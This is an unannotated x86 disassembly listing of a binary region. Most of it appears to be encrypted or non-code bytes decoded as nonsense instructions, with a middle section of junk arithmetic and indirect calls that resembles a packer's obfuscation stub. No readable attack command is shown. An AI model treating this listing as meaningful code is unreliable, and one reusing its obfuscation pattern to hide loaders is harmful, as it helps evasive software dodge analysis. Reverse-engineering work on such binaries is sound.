  4032ac:	xor    dl,ch
  4032ae:	add    bh,BYTE PTR [esi-0x3b4b5d9f]
  4032b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b5:	pop    ebp
  4032b6:	sub    DWORD PTR [esp+ebp*4-0x21],ebp
  4032ba:	stos   DWORD PTR es:[edi],eax
  4032bb:	arpl   WORD PTR [esi],ax
  4032bd:	mov    esp,0x86d7742c
  4032c2:	mov    ah,0xa2
  4032c4:	inc    ebx
  4032c5:	lock in al,dx
  4032c7:	xchg   edi,eax
  4032c8:	jecxz  0x403338
  4032ca:	or     BYTE PTR [ebp+0x61],ch
  4032cd:	addr16 jge 0x403295
  4032d0:	outs   dx,DWORD PTR ds:[esi]
  4032d1:	pushf  
  4032d2:	xor    bl,al
  4032d4:	dec    eax
  4032d5:	loopne 0x40326c
  4032d7:	es xchg ebp,eax
  4032d9:	xor    ah,dh
  4032db:	jp     0x4032e2
  4032dd:	sbb    bh,BYTE PTR [edi-0x41]
  4032e0:	iret   
  4032e1:	mov    edi,0x9e6cb9b
  4032e6:	or     eax,0x606ccef1
  4032eb:	mov    esi,0x499aa0b3
  4032f0:	sbb    edi,DWORD PTR [edx+0x2a]
  4032f3:	or     eax,0x7a19281c
  4032f8:	lahf   
  4032f9:	adc    eax,DWORD PTR [esi]
  4032fb:	sbb    eax,0x7b86202f
  403300:	stos   DWORD PTR es:[edi],eax
  403301:	imul   ecx,esi,0xeeb54796
  403307:	(bad)  
  403308:	add    DWORD PTR [esi],eax
  40330a:	add    esi,DWORD PTR [esi-0x65]
  40330d:	out    dx,eax
  40330e:	aad    0xd3
  403310:	in     eax,0xba
  403312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403313:	test   BYTE PTR ds:0xcfaefd0e,ch
  403319:	repnz pop edx
  40331b:	cmp    esp,DWORD PTR [edx-0x2cf118de]
  403321:	inc    esi
  403322:	xor    al,0x26
  403324:	inc    edi
  403325:	scas   eax,DWORD PTR es:[edi]
  403326:	pop    es
  403327:	cmp    eax,0xd9712b3a
  40332c:	mov    bh,0x9c
  40332e:	prefetch BYTE PTR cs:[edx+esi*2-0x42]
  403334:	retf   0x662c
  403337:	popf   
  403338:	push   esp
  403339:	xor    BYTE PTR [eax+0x2af80d0e],bl
  40333f:	xchg   edi,eax
  403340:	cmp    bh,BYTE PTR [ebx-0x4b08555b]
  403346:	pop    esp
  403347:	xor    al,0xd
  403349:	fisttp WORD PTR ds:0xddfbf5a7
  40334f:	shl    BYTE PTR [ebx-0x42],1
  403352:	xchg   edi,eax
  403353:	push   0x73a98b28
  403358:	fs push ds
  40335a:	xchg   edi,eax
  40335b:	jae    0x4033a9
  40335d:	xchg   esi,eax
  40335e:	rol    DWORD PTR [edi],0x2d
  403361:	mov    cl,0x82
  403363:	pop    ecx
  403364:	jns    0x4033a9
  403366:	repnz mov bl,0xe5
  403369:	jbe    0x4033b0
  40336b:	ret    
  40336c:	ret    
  40336d:	add    al,0x84
  40336f:	jl     0x40334a
  403371:	daa    
  403372:	rcr    DWORD PTR [edi+0x33],1
  403375:	push   ebx
  403376:	inc    eax
  403377:	jle    0x40338d
  403379:	sbb    al,0x2d
  40337b:	cs mov bh,0xe4
  40337e:	mov    DWORD PTR [esi+0x59b43f44],edx
  403384:	sahf   
  403385:	std    
  403386:	or     edx,DWORD PTR [ecx]
  403388:	cwde   
  403389:	jbe    0x403366
  40338b:	in     al,0xc0
  40338d:	dec    ecx
  40338e:	or     BYTE PTR [edi-0x7ffa867e],dh
  403394:	(bad)
  403398:	mov    cs,WORD PTR [edx-0x1b068192]
  40339e:	gs mov ebp,0x40cb189a
  4033a4:	popf   
  4033a5:	retf   
  4033a6:	sbb    ch,BYTE PTR [edi*2+0x30344c5b]
  4033ad:	ss pop ebp
  4033af:	and    BYTE PTR [esi-0x5d],bh
  4033b2:	shl    BYTE PTR [esi],1
  4033b4:	aam    0xad
  4033b6:	call   0x5761:0x40aaa9bc
  4033bd:	pop    edx
  4033be:	mov    dh,0x2f
  4033c0:	inc    BYTE PTR ds:[eax+0x62]
  4033c4:	retf   0xcbf7
  4033c7:	and    eax,0x369e853
  4033cc:	jmp    0x403350
  4033ce:	scas   eax,DWORD PTR es:[edi]
  4033cf:	int3   
  4033d0:	test   eax,0xa5990f0d
  4033d5:	int    0x4a
  4033d7:	ins    BYTE PTR es:[edi],dx
  4033d8:	ror    cl,0x98
  4033db:	push   ss
  4033dc:	rcr    al,cl
  4033de:	push   esp
  4033df:	scas   al,BYTE PTR es:[edi]
  4033e0:	adc    al,0x6b
  4033e2:	fisub  DWORD PTR [eax-0x4b]
  4033e5:	test   cl,ah
  4033e7:	stc    
  4033e8:	das    
  4033e9:	push   ds
  4033ea:	mov    DWORD PTR [eax+0x4537cbbb],eax
  4033f0:	sti    
  4033f1:	pusha  
  4033f2:	loope  0x403382
  4033f4:	jo     0x40338f
  4033f6:	stos   BYTE PTR es:[edi],al
  4033f7:	idiv   DWORD PTR [ecx+0x3fb1505f]
  4033fd:	(bad)  [esi+0x3e]
  403400:	call   0x487c1154
  403405:	lds    ebx,FWORD PTR [esi+0x753b8d9e]
  40340b:	int3   
  40340c:	cmc    
  40340d:	inc    esi
  40340e:	push   edx
  40340f:	test   eax,0x7e5ce98b
  403414:	or     al,0x93
  403416:	dec    esp
  403417:	pop    es
  403418:	cmp    esp,ebx
  40341a:	xlat   BYTE PTR ds:[ebx]
  40341b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40341c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40341d:	mov    ebp,0x79c0e82b
  403422:	push   edx
  403423:	add    cl,BYTE PTR [edx]
  403425:	out    0xa8,eax
  403427:	lock repnz mov dh,0x97
  40342b:	arpl   WORD PTR [esi+ebp*4+0x75],dx
  40342f:	lock adc BYTE PTR [ebx],0xbe
  403433:	popa   
  403434:	mov    al,ds:0xa1351a5c
  403439:	scas   al,BYTE PTR es:[edi]
  40343a:	gs sub eax,0x39293e4c
  403440:	cs jns 0x40343c
  403443:	cli    
  403444:	cs cwde 
  403446:	test   eax,0xeb21719f
  40344b:	(bad)  
  40344d:	test   BYTE PTR [edx+0x49],ah
  403450:	xlat   BYTE PTR ds:[ebx]
  403451:	(bad)  
  403452:	and    ecx,DWORD PTR [ebx]
  403454:	in     al,0xa3
  403456:	call   0x8f34d142
  40345b:	cwde   
  40345c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40345d:	mov    esi,fs
  40345f:	adc    BYTE PTR [ecx],ch
  403461:	sub    al,0x12
  403463:	hlt    
  403464:	add    al,BYTE PTR [ecx+eax*2]
  403467:	xchg   ebp,eax
  403468:	xchg   ecx,eax
  403469:	ins    BYTE PTR es:[edi],dx
  40346a:	sbb    eax,0x5a431004
  40346f:	lods   eax,DWORD PTR ds:[esi]
  403470:	fcmovnbe st,st(2)
  403472:	lock sbb eax,0x9396ec3f
  403478:	(bad)  
  403479:	shr    DWORD PTR [ebp-0x6f35163f],0x95
  403480:	popa   
  403481:	lods   eax,DWORD PTR ds:[esi]
  403482:	jb     0x403458
  403484:	cmp    al,0x89
  403486:	(bad)  
  403487:	fnstcw WORD PTR ds:0x91243a14
  40348d:	imul   DWORD PTR [ebp-0x65c1b66e]
  403493:	and    BYTE PTR [eax],bl
  403495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403496:	stos   BYTE PTR es:[edi],al
  403497:	imul   ebx,DWORD PTR [ebx-0x53585ae9],0x51f56d82
  4034a1:	inc    esp
  4034a2:	cmp    esp,DWORD PTR [esi+0x6c]
  4034a5:	xchg   ecx,eax
  4034a6:	jecxz  0x403512
  4034a8:	into   
  4034a9:	xor    eax,0x83a25cab
  4034ae:	push   ss
  4034af:	loopne 0x403514
  4034b1:	dec    eax
  4034b2:	cs push ds
  4034b4:	sbb    edx,DWORD PTR [edi+eax*4]
  4034b7:	and    BYTE PTR [ecx-0x4a],0xee
  4034bb:	add    DWORD PTR ds:0x99f912f3,edx
  4034c1:	xchg   ebx,eax
  4034c2:	jmp    0xa1fd9fb3
  4034c7:	daa    
  4034c8:	sub    eax,ebx
  4034ca:	icebp  
  4034cb:	adc    edi,DWORD PTR [bx+0x47]
  4034cf:	add    esp,ebp
  4034d1:	retf   0x1627
  4034d4:	loopne 0x4034a9
  4034d6:	push   esi
  4034d7:	jae    0x403476
  4034d9:	jecxz  0x403488
  4034db:	rol    BYTE PTR [edx-0x61],0x80
  4034df:	jle    0x40352b
  4034e1:	inc    ebx
  4034e2:	ror    bh,cl
  4034e4:	fst    QWORD PTR [esi]
  4034e6:	jb     0x40353d
  4034e8:	or     BYTE PTR [edi],0x6b
  4034eb:	ror    BYTE PTR [ebx+ecx*4],1
  4034ee:	dec    ebp
  4034ef:	in     al,dx
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x428123,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x31],ch
  403514:	ins    DWORD PTR es:[edi],dx
  403515:	(bad)  
  403516:	mov    esi,0x1818e5c3
  40351b:	sahf   
  40351c:	adc    bl,BYTE PTR [eax]
  40351e:	sbb    BYTE PTR [ecx],ah
  403520:	mov    dh,BYTE PTR [ebx+0x379e47f8]
  403526:	cmp    eax,esi
  403528:	loop   0x4035a3
  40352a:	in     eax,dx
  40352b:	shl    ebp,0x81
  40352e:	retf   0xc09
  403531:	cmp    esi,DWORD PTR [ecx]
  403533:	xchg   DWORD PTR [edx+0x1],edx
  403536:	arpl   WORD PTR [edx-0x14],si
  403539:	mov    bl,0x5c
  40353b:	data16 daa 
  40353d:	pop    eax
  40353e:	in     eax,dx
  40353f:	fbstp  TBYTE PTR [ebx+ecx*2+0xf]
  403543:	cmp    ecx,DWORD PTR [edi+0x28]
  403546:	xor    ebp,ebx
  403548:	mov    al,0x88
  40354a:	or     eax,0xcf398103
  40354f:	jbe    0x4034fa
  403551:	adc    ecx,DWORD PTR [ebx-0x3f6fa469]
  403557:	push   ebp
  403558:	dec    esi
  403559:	into   
  40355a:	fisub  WORD PTR [edx]
  40355c:	repz mov cl,0xdc
  40355f:	stos   BYTE PTR es:[edi],al
  403560:	cwde   
  403561:	pmaddwd mm3,QWORD PTR [ecx+0x1d2f71bc]
  403568:	sbb    BYTE PTR [eax-0x3cb490aa],bl
  40356e:	movzx  ebp,BYTE PTR [esi+0x46]
  403572:	mov    esp,0x6766dadf
  403577:	icebp  
  403578:	inc    edx
  403579:	out    0x58,eax
  40357b:	sbb    DWORD PTR [ebp+0x59aa455c],0x248c211f
  403585:	jmp    0x5d91:0x28ad2bff
  40358c:	mov    esp,0x3d11c7e9
  403591:	mov    WORD PTR [esp+edx*1-0x5a],gs
  403595:	adc    ah,BYTE PTR [ebx-0x588cf7e1]
  40359b:	sbb    eax,0xd3945cee
  4035a0:	cld    
  4035a1:	shl    BYTE PTR ds:0x8b5da4c6,1
  4035a7:	add    BYTE PTR [eax+0x667d7b82],dh
  4035ad:	xchg   BYTE PTR ds:0x41a9db6d,bl
  4035b3:	fnsave [eax]
  4035b5:	mov    al,ds:0x9e99b8e
  4035ba:	outs   dx,DWORD PTR ds:[esi]
  4035bb:	int3   
  4035bc:	jb     0x403624
  4035be:	test   al,0xc3
  4035c0:	shl    ebp,0xc6
  4035c3:	lods   eax,DWORD PTR ds:[esi]
  4035c4:	jg     0x403631
  4035c6:	adc    ah,BYTE PTR [edx]
  4035c8:	sbb    bl,BYTE PTR [esi]
  4035ca:	iret   
  4035cb:	mov    ds:0x3ff77c35,al
  4035d0:	sbb    al,0xb3
  4035d2:	aad    0x1
  4035d4:	test   ecx,edx
  4035d6:	mov    esp,0x744b4cf3
  4035db:	stc    
  4035dc:	push   esp
  4035dd:	rcr    DWORD PTR [eax-0x77d4b3db],0x23
  4035e4:	inc    esp
  4035e5:	and    al,0x79
  4035e7:	mov    edx,0x28c11257
  4035ec:	xchg   BYTE PTR [edx],ah
  4035ee:	aaa    
  4035ef:	iret   
  4035f0:	jmp    FWORD PTR [edx]
  4035f2:	push   edi
  4035f3:	xchg   ecx,eax
  4035f4:	scas   al,BYTE PTR es:[edi]
  4035f5:	pop    ss
  4035f6:	pushf  
  4035f7:	cli    
  4035f8:	mov    ecx,0xbcc0b395
  4035fd:	mov    al,0xf1
  4035ff:	fstp   TBYTE PTR ds:0xf8b87ca8
  403605:	pop    ecx
  403606:	jle    0x403678
  403608:	je     0x4035d0
  40360a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40360b:	cld    
  40360c:	es mov ecx,0xe11eccc6
  403612:	inc    edi
  403613:	data16 fistp DWORD PTR [ebp+edx*8+0x6e]
  403618:	lahf   
  403619:	jbe    0x40368d
  40361b:	inc    esi
  40361c:	mov    bl,0x69
  40361e:	cld    
  40361f:	mov    esi,0x501c691c
  403624:	jl     0x4036a4
  403626:	push   es
  403627:	mov    esp,0x4c228086
  40362c:	retf   0x77bc
  40362f:	sub    eax,0xb0372921
  403634:	or     eax,0xc9f9acd0
  403639:	fst    QWORD PTR [ecx]
  40363b:	jns    0x4036af
  40363d:	add    al,0xbb
  40363f:	mul    DWORD PTR ds:0xb2ae61c9
  403645:	stos   BYTE PTR es:[edi],al
  403646:	mov    esi,0x11709081
  40364b:	ret    
  40364c:	fcom   QWORD PTR [ebx+0x602f4717]
  403652:	or     eax,0x306a7534
  403657:	adc    edi,ebp
  403659:	dec    edi
  40365a:	dec    eax
  40365b:	ds pop eax
  40365d:	div    dh
  40365f:	mov    cl,0xee
  403661:	and    al,0x38
  403663:	cdq    
  403664:	test   eax,0x68e121ec
  403669:	in     al,0x3
  40366b:	addr16 pushf 
  40366d:	(bad)  
  40366e:	popf   
  40366f:	mov    es,WORD PTR [eax-0x54a65dea]
  403675:	leave  
  403676:	test   al,0xc
  403678:	fcmovb st,st(5)
  40367a:	mov    edx,0x283cd940
  40367f:	out    0xd7,al
  403681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403682:	rcl    BYTE PTR [edi-0xf],1
  403685:	test   eax,0xf9f6a838
  40368a:	cmp    ebx,DWORD PTR [esi+0xe]
  40368d:	mov    ebx,0x9e2b4be6
  403692:	pop    ss
  403693:	js     0x403617
  403695:	int3   
  403696:	out    0x84,eax
  403698:	ja     0x403681
  40369a:	sub    dl,BYTE PTR [ecx-0x70c9592a]
  4036a0:	mov    ch,0xd6
  4036a2:	sub    DWORD PTR [ebp+ecx*1-0x62b699bf],ebp
  4036a9:	gs or  eax,0xdb098cd2
  4036af:	mov    al,ds:0xfb212065
  4036b4:	ins    DWORD PTR es:[edi],dx
  4036b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b6:	adc    eax,0xe5f70e24
  4036bb:	rol    BYTE PTR [eax],cl
  4036bd:	xchg   ebx,eax
  4036be:	pop    es
  4036bf:	fwait
  4036c0:	pop    edx
  4036c1:	(bad)  
  4036c2:	fmulp  st(0),st
  4036c4:	cmp    eax,0x88ba45fd
  4036c9:	mov    ebp,0xedbda55d
  4036ce:	out    0xf6,al
  4036d0:	jae    0x4036fa
  4036d2:	ins    DWORD PTR es:[edi],dx
  4036d3:	jns    0x4036ae
  4036d5:	adc    BYTE PTR [edx+0x56008be4],ah
  4036db:	fsub   QWORD PTR [ebx]
  4036dd:	jns    0x40372f
  4036df:	ins    DWORD PTR es:[edi],dx
  4036e0:	inc    ebp
  4036e1:	loope  0x403668
  4036e3:	popa   
  4036e4:	fidivr DWORD PTR [esi]
  4036e6:	and    dh,BYTE PTR [ecx+esi*1]
  4036e9:	popa   
  4036ea:	dec    BYTE PTR [edx]
  4036ec:	sti    
  4036ed:	popf   
  4036ee:	jo     0x403755
  4036f0:	cdq    
  4036f1:	jg     0x403682
  4036f3:	xchg   esi,eax
  4036f4:	jp     0x403741
  4036f6:	mov    WORD PTR [ebx-0x20],ds
  4036f9:	lock out 0xa5,al
  4036fc:	jl     0x4036a8
  4036fe:	das    
  4036ff:	loop   0x4036ca
  403701:	and    DWORD PTR [esi+0x2cf432e2],esi
  403707:	(bad)  
  403708:	and    BYTE PTR [ebx+0xf6f8b1d],al
  40370e:	int    0xaf
  403710:	pushf  
  403711:	sbb    al,cl
  403713:	jbe    0x403701
  403715:	ret    
  403716:	mov    edx,0x41b3a264
  40371b:	cs inc edi
  40371d:	or     DWORD PTR [ecx+0x4557f4dc],0xffffffb4
  403724:	add    cl,BYTE PTR [ebx+0x75]
  403727:	or     ebx,DWORD PTR [edi+0x495489f1]
  40372d:	pushf  
  40372e:	xor    bh,dl
  403730:	or     BYTE PTR [ebx-0x74],bh
  403733:	mov    esi,0xc1fc8d6d
  403738:	dec    ecx
  403739:	and    DWORD PTR [edi+edi*1],ebp
  40373c:	test   al,0xdd
  40373e:	cld    
  40373f:	cdq    
  403740:	dec    esp
  403741:	jmp    WORD PTR ds:0x94fa53f2
  403748:	and    al,0x47
  40374a:	mov    ds:0x436bc569,eax
  40374f:	sbb    BYTE PTR [edx],al
  403751:	xchg   edi,eax
  403752:	shl    DWORD PTR [ecx+0x78],0x39
  403756:	(bad)  
  403757:	(bad)  
  403758:	retf   
  403759:	adc    cl,0x9
  40375c:	and    dl,BYTE PTR [edi-0x486a6572]
  403762:	push   es
  403763:	sahf   
  403764:	push   0x7a1be9d0
  403769:	and    DWORD PTR [ecx-0x77],ebx
  40376c:	jns    0x40379a
  40376e:	pop    ss
  40376f:	jmp    0xaf98:0x3fc607d
  403776:	mov    eax,ds:0xa1fdf413
  40377b:	ja     0x40376e
  40377d:	outs   dx,DWORD PTR ds:[esi]
  40377e:	mov    eax,ds:0x47966eea
  403783:	jecxz  0x403743
  403785:	jns    0x40374b
  403787:	dec    esp
  403788:	test   ebp,edx
  40378a:	fwait
  40378b:	lock sbb ecx,DWORD PTR [eax]
  40378e:	jae    0x403750
  403790:	push   edx
  403791:	aas    
  403792:	lods   al,BYTE PTR ds:[esi]
  403793:	lahf   
  403794:	cdq    
  403795:	jnp    0x403739
  403797:	retf   0xaf43
  40379a:	dec    BYTE PTR [ebx+esi*4-0x4d]
  40379e:	mov    ecx,0x3eb2448f
  4037a3:	xor    eax,0xf06d6b99
  4037a8:	cmp    BYTE PTR [ebp+0x4b57c383],ch
  4037ae:	cmp    BYTE PTR [edx],bh
  4037b0:	jmp    DWORD PTR [ecx+0x4a5dbe93]
  4037b6:	pushf  
  4037b7:	fnstsw WORD PTR [eax+0x3a]
  4037ba:	aam    0x60
  4037bc:	dec    ecx
  4037bd:	mov    ecx,edi
  4037bf:	popa   
  4037c0:	(bad)
  4037c3:	pop    esi
  4037c4:	popf   
  4037c5:	inc    DWORD PTR [ecx]
  4037c7:	outs   dx,DWORD PTR ds:[esi]
  4037c8:	inc    bp
  4037ca:	add    al,0x94
  4037cc:	xchg   BYTE PTR [eax],ch
  4037ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037cf:	mov    dl,al
  4037d1:	in     al,0x2f
  4037d3:	loop   0x403827
  4037d5:	and    al,0x9b
  4037d7:	test   cl,al
  4037d9:	out    0xfe,eax
  4037db:	pop    ebx
  4037dc:	mov    edi,0xe0495879
  4037e1:	sbb    esi,ecx
  4037e3:	jge    0x4037ca
  4037e5:	fwait
  4037e6:	jb     0x403770
  4037e8:	and    BYTE PTR [eax-0x4bb4ae54],0xc
  4037ef:	or     al,0xe3
  4037f1:	cmc    
  4037f2:	lods   eax,DWORD PTR ds:[esi]
  4037f3:	fsubr  DWORD PTR [esp+eiz*2+0x5250e01b]
  4037fa:	push   ecx
  4037fb:	int3   
  4037fc:	or     al,0x35
  4037fe:	repnz pop esi
  403800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403801:	retf   0x33eb
  403804:	(bad)  
  403805:	jmp    0x4dd1d8e6
  40380a:	ror    DWORD PTR [esi+0x61],0xbf
  40380e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40380f:	(bad)  
  403811:	(bad)  
  403812:	shl    DWORD PTR [esp+edi*2-0x4e],1
  403816:	lds    ebx,FWORD PTR [ebp-0x2c553921]
  40381c:	mov    ebx,0x1d7776c7
  403821:	ret    
  403822:	neg    bh
  403824:	sbb    al,0x73
  403826:	out    dx,eax
  403827:	enter  0x192b,0x82
  40382b:	test   al,0x8a
  40382d:	sbb    BYTE PTR [ebp+0x7],al
  403830:	add    al,0x7e
  403832:	sub    dl,al
  403834:	xchg   BYTE PTR [ebx],bl
  403836:	adc    DWORD PTR [ebx-0x31],0xd0155b8
  40383d:	jle    0x4037c1
  40383f:	sub    DWORD PTR [edx-0x6520f33a],0x4de3e01b
  403849:	dec    edx
  40384a:	fadd   QWORD PTR [eax-0x4ba9edaa]
  403850:	mov    eax,0xf7a2cb7c
  403855:	hlt    
  403856:	and    DWORD PTR [edi],ebp
  403858:	jecxz  0x403824
  40385a:	pop    ds
  40385b:	leave  
  40385c:	add    DWORD PTR [ebp-0x59],edi
  40385f:	bound  esi,QWORD PTR [ebx]
  403861:	mov    gs,WORD PTR [eax-0x6d4633c4]
  403867:	dec    eax
  403868:	loopne 0x4038cd
  40386a:	cmp    ecx,DWORD PTR ds:0x9b74f89b
  403870:	in     eax,0x9d
  403872:	dec    ebp
  403873:	xor    cl,dh
  403875:	cli    
  403876:	push   ecx
  403877:	inc    eax
  403878:	and    edi,DWORD PTR [eax+ecx*1]
  40387b:	mov    esi,0x95e5bac5
  403880:	in     eax,0xaa
  403882:	xor    bl,BYTE PTR ds:0xcfbd0c1f
  403888:	sub    al,0xb5
  40388a:	cmp    bh,BYTE PTR [esi+0x61df9801]
  403890:	or     eax,0x6dfad995
  403895:	add    DWORD PTR [esi+0x3589a73e],esp
  40389b:	and    al,0x1a
  40389d:	mov    eax,esp
  40389f:	xchg   esi,eax
  4038a0:	(bad)  
  4038a1:	xor    ebp,DWORD PTR [edx]
  4038a3:	ins    DWORD PTR es:[edi],dx
  4038a4:	out    dx,al
  4038a5:	sub    ebx,esi
  4038a7:	sub    BYTE PTR [eax+0x43],cl
  4038aa:	cli    
  4038ab:	xchg   BYTE PTR [edi],al
  4038ad:	pop    ebp
  4038ae:	jmp    0x1fb2:0xb9d424d1
  4038b5:	inc    ebp
  4038b6:	sub    dl,dl
  4038b8:	or     ch,BYTE PTR [ebp-0x66]
  4038bb:	daa    
  4038bc:	inc    eax
  4038bd:	add    BYTE PTR [edx+0xd],ch
  4038c0:	sti    
  4038c1:	fwait
  4038c2:	sub    ebx,esp
  4038c4:	std    
  4038c5:	mov    edx,0xeebd6bbb
  4038ca:	std    
  4038cb:	ret    0xbd68
  4038ce:	stc    
  4038cf:	ret    0xc46b
  4038d2:	stos   DWORD PTR es:[edi],eax
  4038d3:	jmp    0x1770b39a
  4038d8:	xchg   edx,eax
  4038d9:	xchg   esi,eax
  4038da:	push   ebx
  4038db:	sbb    ebx,DWORD PTR [ecx-0x6c]
  4038de:	add    al,0xd1
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	cmp    DWORD PTR ds:0x428223,0x0
  4038ea:	not    DWORD PTR ds:0x42811b
  4038f0:	mov    ecx,DWORD PTR ds:0x428247
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428223,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428e98
  403913:	xor    edx,DWORD PTR ds:0x42820f
  403919:	neg    DWORD PTR ds:0x428223
  40391f:	xor    DWORD PTR ds:0x428117,0x12a5
  403929:	and    DWORD PTR ds:0x428367,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42824b
  403939:	or     ecx,DWORD PTR ds:0x4281ff
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428123,0x0
  403949:	mov    DWORD PTR ds:0x428367,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428123,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428d6c
  40397f:	adc    DWORD PTR ds:0x428257,0x42813f
  403989:	sbb    DWORD PTR ds:0x428243,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428343
  403999:	or     DWORD PTR ds:0x42821f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428247
  4039a7:	adc    edx,DWORD PTR ds:0x42822b
  4039ad:	mov    DWORD PTR ds:0x428247,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x4281ff,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x428267,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x42825b,0x428367
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42813b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428117,0x4282df
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428123,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42811b,0x4282b3
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42822f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428247,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428117,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428243,0x0
  403a3e:	mov    DWORD PTR ds:0x4282cf,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x428367
  403a57:	cmp    DWORD PTR ds:0x428243,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d48
  403a6f:	mov    edx,DWORD PTR ds:0x4282ff
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x428393
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428143,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428137,0x2089
  403aa2:	or     DWORD PTR ds:0x42811b,0x113b
  403aac:	mov    eax,ds:0x422390
  403ab1:	cmp    DWORD PTR ds:0x428143,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42820f
  403ac3:	mov    DWORD PTR ds:0x4281f3,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x4282e3,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428143,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428143,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x4280e3
  403af8:	call   DWORD PTR ds:0x428d70
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42820b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42824f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42833b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42812b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0x6a067284
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi+0xf181812],bl
  403b4b:	jbe    0x403b24
  403b4d:	sub    BYTE PTR [ebx],al
  403b4f:	scas   al,BYTE PTR es:[edi]
  403b50:	hlt    
  403b51:	outs   dx,BYTE PTR ds:[esi]
  403b52:	mov    ?,ebp
  403b54:	(bad)  
  403b55:	out    0xdf,eax
  403b57:	inc    ebp
  403b58:	add    esi,edx
  403b5a:	jmp    0x47:0x1b6cd76
  403b61:	mov    al,0x90
  403b63:	fnstenv [esi+0xd651a75]
  403b69:	stos   BYTE PTR es:[edi],al
  403b6a:	loope  0x403bb4
  403b6c:	or     DWORD PTR [ecx],edi
  403b6e:	cmp    ch,BYTE PTR [edi+0xe25fe81]
  403b74:	xor    al,0x1d
  403b76:	mov    ch,0xf4
  403b78:	mov    ecx,0x35407a3b
  403b7d:	push   esi
  403b7e:	push   ebp
  403b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b80:	loopne 0x403b7c
  403b82:	mov    edx,0x85c4aaed
  403b87:	ret    0x3746
  403b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b8b:	loopne 0x403b6b
  403b8d:	bound  esp,QWORD PTR [ebp-0xc]
  403b90:	sbb    al,0xf5
  403b92:	cwde   
  403b93:	lods   al,BYTE PTR ds:[esi]
  403b94:	push   ss
  403b95:	mov    eax,0xefeb942f
